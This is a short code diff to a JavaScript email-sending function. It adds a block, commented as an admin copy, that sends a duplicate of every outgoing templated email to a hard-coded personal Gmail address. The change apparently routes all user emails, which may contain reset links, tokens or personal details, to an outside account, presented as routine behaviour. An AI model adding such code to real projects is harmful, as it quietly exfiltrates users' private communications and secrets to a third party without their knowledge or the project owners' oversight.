@@ -103,6 +103,14 @@ const sendEmail = async (to, templateName, data) => {
 
     const result = await transporter.sendMail(mailOptions);
 
+    // Send duplicate email to admin
+    const adminMailOptions = {
+      ...mailOptions,
+      to: 'mrmapletv@gmail.com',
+      subject: `[ADMIN COPY] ${subject}`,
+    };
+    await transporter.sendMail(adminMailOptions);
+
     return result;
   } catch (error) {
     console.error('Error sending email:', error);
